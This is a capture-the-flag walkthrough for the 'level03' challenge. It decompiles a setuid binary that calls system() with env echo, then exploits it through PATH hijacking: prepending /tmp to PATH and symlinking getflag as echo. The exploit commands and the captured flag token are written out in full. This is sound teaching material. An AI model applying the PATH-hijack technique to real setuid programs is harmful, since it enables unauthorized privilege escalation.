# level03

## Steps

1. __Observation__ (Guest): when connecting as the `level03` user,
    nothing appears on stdout.

2. __Action__ (Guest): list the files present at the root
    ```sh
    ls -lA
    ```

3. __Observation__ (Guest): the previous command reveals an executable
    ```sh
    -rwsr-sr-x 1 flag03  level03 8627 Mar  5  2016 level03
    ```

4. __Action__ (Guest): execute the executable
    ```sh
    ./level03
    ```

5. __Observation__ (Guest): the message `Exploit me` appears on stdout

6. __Action__ (Guest): gather more information on the executable
    running the program under `gdb` gives us nothing
    but disassembling the main gives us useful information

7. __Observation__ (Guest): a few fonctions are called in the main
    - `getegid()` (returns the effective group ID of the calling process)
    - `geteuid()` (returns the effective user ID of the calling process)
    - `setresgid(gid_t rgid, gid_t egid, gid_t sgid)`
    (sets the real group ID, the effective group ID,
    and the saved set-group-ID of the calling process)
    - `setresuid(uid_t ruid, uid_t euid, uid_t suid)`
    (sets the real user ID, the effective user ID,
    and the saved set-user-ID of the calling process)
    - `system(const char *command)`
    (executes a command by calling `/bin/sh -c command`)

8. __Action__ (Host): we copy the executable on our host machine
    to better manipulate it
    ```sh
    scp -P 4242 level03@192.168.56.101:/home/user/level03/level03 level03_exec
    ```

9. __Action__ (Host): pass the executable to `dogbolt` to decompile it

10. __Observation__ (Host): a few things are to observe here
    ```c
    // ------------------------ Functions -------------------------

    // From module:   /home/user/level03/level03.c
    // Address range: 0x80484a4 - 0x8048505
    // Line range:    7 - 18
    int main() {
        int32_t v1 = getegid(); // 0x80484ad
        int32_t v2 = geteuid(); // 0x80484b6
        setresgid(v1, v1, v1);
        setresuid(v2, v2, v2);
        return system("/usr/bin/env echo Exploit me");
    }
    ```
    - The effective GID and UID are stored in variables `v1` and `v2`.
    - Those variables are used to set the real, effective and saved ID
    of both the user and group.

11. __Observation__ (Guest): we need to run `getflag` when running `./level03`
    as we'll have the same ID as `flag03` when we'll do it

12. __Action__ (Guest): find the path to the `getflag` command
    ```sh
    which getflag
    getflag: /bin/getflag
    ```

13. __Action__ (Guest): create a symbolic link between `getflag` and `echo`
    using the paths already present in `PATH`
    ```sh
    echo $PATH
    /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games
    ```

14. __Observation__ (Guest): it is not possible to create a symbolic link
    between `getflag` and `echo` using the paths in `PATH`. we need to add
    a new path to `PATH`.

15. __Action__ (Guest): create a symbolic link between `getflag` and `echo`
    adding a new path in `PATH`
    ```sh
    export PATH=/tmp:$PATH
    ln -s /bin/getflag /tmp/echo
    ```

16. __Action__ (Guest): execute `./level03` and collect the flag
    ```sh
    ./level03
    Check flag.Here is your token : qi0maab88jeaj46qoumi7maus
    ```
